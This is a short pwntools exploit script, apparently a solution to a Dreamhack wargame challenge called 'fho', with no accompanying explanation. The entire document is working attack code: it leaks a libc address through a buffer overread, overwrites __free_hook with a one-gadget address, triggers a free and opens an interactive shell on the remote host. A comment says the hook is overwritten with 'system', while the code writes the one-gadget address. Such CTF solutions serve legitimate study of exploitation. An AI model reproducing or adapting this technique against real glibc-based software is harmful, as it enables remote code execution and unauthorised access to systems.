from pwn import *

p = remote("host3.dreamhack.games", 12270)
e = ELF("./fho")
libc = ELF("./libc-2.27.so")

# [1] Leak libc base
buf = b"A"*0x48
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
libc_base = u64(p.recvline()[:-1].ljust(8, b"\x00")) - (libc.symbols["__libc_start_main"] + 231)
system = libc.symbols["system"] + libc_base
free_hook = libc.symbols["__free_hook"] + libc_base
og = libc_base + 0x4f432

# [2] Overwrite 'free_hook' with 'system'
p.recvuntil("To write: ")
p.sendline(str(free_hook))
p.recvuntil("With: ")
p.sendline(str(og))

# [3] Exploit
p.recvuntil("To free: ")
p.sendline(str(12345)) # doesn't matter

p.interactive()
